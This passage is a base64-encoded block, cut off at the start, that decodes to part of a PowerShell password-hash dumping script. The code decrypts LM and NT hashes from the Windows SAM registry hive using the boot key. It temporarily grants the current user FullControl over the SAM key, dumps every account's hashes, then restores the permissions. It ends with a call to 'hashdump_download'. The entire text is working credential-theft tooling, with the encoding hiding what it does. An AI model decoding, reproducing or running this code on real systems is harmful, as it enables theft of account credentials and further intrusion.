1wYXNzd29yZDsKICAgIH0KCiAgICAjIE5UIEhhc2gKICAgIGlmICgkZW5jX250X2hhc2gpCiAgICB7CiAgICAgICAgJG50aGFzaCA9IERlY3J5cHRTaW5nbGVIYXNoICRyaWQgJGhib290a2V5ICRlbmNfbnRfaGFzaCAkYW50cGFzc3dvcmQ7CiAgICB9CgogICAgcmV0dXJuICwoJGxtaGFzaCwkbnRoYXNoKQp9CgpmdW5jdGlvbiBEZWNyeXB0U2luZ2xlSGFzaCgkcmlkLFtieXRlW11dJGhib290a2V5LFtieXRlW11dJGVuY19oYXNoLFtieXRlW11dJGxtbnRzdHIpCnsKICAgICRkZXNrZXlzID0gc2lkX3RvX2tleSAkcmlkOwogICAgJG1kNSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCk7CiAgICAkcmM0X2tleSA9ICRtZDUuQ29tcHV0ZUhhc2goJGhib290a2V5WzAuLjB4MGZdICsgW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRyaWQpICsgJGxtbnRzdHIpOwogICAgJHJjNCA9IE5ld1JDNCAkcmM0X2tleTsKICAgICRvYmZrZXkgPSAkcmM0LmVuY3J5cHQoJGVuY19oYXNoKTsKICAgICRoYXNoID0gKGRlc19kZWNyeXB0ICAkb2Jma2V5WzAuLjddICRkZXNrZXlzWzBdKSArCiAgICAgICAgKGRlc19kZWNyeXB0ICRvYmZrZXlbOC4uJCgkb2Jma2V5Lkxlbmd0aCAtIDEpXSAkZGVza2V5c1sxXSk7CiAgICByZXR1cm4gLCRoYXNoOwp9CgpmdW5jdGlvbiBHZXQtVXNlcktleXMKewogICAgbHMgSEtMTTpcU0FNXFNBTVxEb21haW5zXEFjY291bnRcVXNlcnMgfAogICAgICAgIHdoZXJlIHskXy5QU0NoaWxkTmFtZSAtbWF0Y2ggIl5bMC05QS1GYS1mXXs4fSQifSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgQWxpYXNQcm9wZXJ0eSBLZXlOYW1lIFBTQ2hpbGROYW1lIC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgUmlkIHtbQ29udmVydF06OlRvSW50MzIoJHRoaXMuUFNDaGlsZE5hbWUsIDE2KX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBWIHtbYnl0ZVtdXSgkdGhpcy5HZXRWYWx1ZSgiViIpKX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBVc2VyTmFtZSB7R2V0LVVzZXJOYW1lKCR0aGlzLkdldFZhbHVlKCJWIikpfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IEhhc2hPZmZzZXQge1tCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkdGhpcy5HZXRWYWx1ZSgiViIpWzB4OWMuLjB4OWZdLDApICsgMHhDQ30gLVBhc3NUaHJ1Cn0KCmZ1bmN0aW9uIER1bXBIYXNoZXMKewogICAgTG9hZEFwaQogICAgJGJvb3RrZXkgPSBHZXQtQm9vdEtleTsKICAgICRoYm9vdEtleSA9IEdldC1IQm9vdEtleSAkYm9vdGtleTsKICAgIEdldC1Vc2VyS2V5cyB8ICV7CiAgICAgICAgJGhhc2hlcyA9IEdldC1Vc2VySGFzaGVzICRfICRoQm9vdEtleTsKICAgICAgICAiezB9OnsxfTp7Mn06ezN9Ojo6IiAtZiAoJF8uVXNlck5hbWUsJF8uUmlkLAogICAgICAgICAgICBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hlc1swXSkuUmVwbGFjZSgiLSIsIiIpLlRvTG93ZXIoKSwKICAgICAgICAgICAgW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoZXNbMV0pLlJlcGxhY2UoIi0iLCIiKS5Ub0xvd2VyKCkpOwogICAgfQp9CgogICAgI2h0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTMvMDUvcG9zaGluZy1oYXNoZXMtcGFydC0yLmh0bWw/c2hvd0NvbW1lbnQ9MTM4NjcyNTg3NDE2NyNjODUxMzk4MDcyNTgyMzc2NDA2MAogICAgaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikpCiAgICB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiU2NyaXB0IHJlcXVpcmVzIGVsZXZhdGVkIG9yIGFkbWluaXN0cmF0aXZlIHByaXZpbGVnZXMuIgogICAgICAgIFJldHVybgogICAgfSAKICAgIGVsc2UKICAgIHsKICAgICAgICAjU2V0IHBlcm1pc3Npb25zIGZvciB0aGUgY3VycmVudCB1c2VyLgogICAgICAgICRydWxlID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SZWdpc3RyeUFjY2Vzc1J1bGUgKAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKS5OYW1lLAogICAgICAgICJGdWxsQ29udHJvbCIsCiAgICAgICAgW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkluaGVyaXRhbmNlRmxhZ3NdIk9iamVjdEluaGVyaXQsQ29udGFpbmVySW5oZXJpdCIsCiAgICAgICAgW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLlByb3BhZ2F0aW9uRmxhZ3NdIk5vbmUiLAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BY2Nlc3NDb250cm9sVHlwZV0iQWxsb3ciKQogICAgICAgICRrZXkgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5XTo6TG9jYWxNYWNoaW5lLk9wZW5TdWJLZXkoCiAgICAgICAgIlNBTVxTQU1cRG9tYWlucyIsCiAgICAgICAgW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeUtleVBlcm1pc3Npb25DaGVja106OlJlYWRXcml0ZVN1YlRyZWUsCiAgICAgICAgW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLlJlZ2lzdHJ5UmlnaHRzXTo6Q2hhbmdlUGVybWlzc2lvbnMpCiAgICAgICAgJGFjbCA9ICRrZXkuR2V0QWNjZXNzQ29udHJvbCgpCiAgICAgICAgJGFjbC5TZXRBY2Nlc3NSdWxlKCRydWxlKQogICAgICAgICRrZXkuU2V0QWNjZXNzQ29udHJvbCgkYWNsKQoKICAgICAgICBEdW1wSGFzaGVzCgogICAgICAgICNSZW1vdmUgdGhlIHBlcm1pc3Npb25zIGFkZGVkIGFib3ZlLgogICAgICAgICR1c2VyID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKICAgICAgICAkYWNsLkFjY2VzcyB8IHdoZXJlIHskXy5JZGVudGl0eVJlZmVyZW5jZS5WYWx1ZSAtZXEgJHVzZXJ9IHwgJXskYWNsLlJlbW92ZUFjY2Vzc1J1bGUoJF8pfSB8IE91dC1OdWxsCiAgICAgICAgU2V0LUFjbCBIS0xNOlxTQU1cU0FNXERvbWFpbnMgJGFjbAoKICAgIH0KfQpoYXNoZHVtcF9kb3dubG9hZAoKCg==
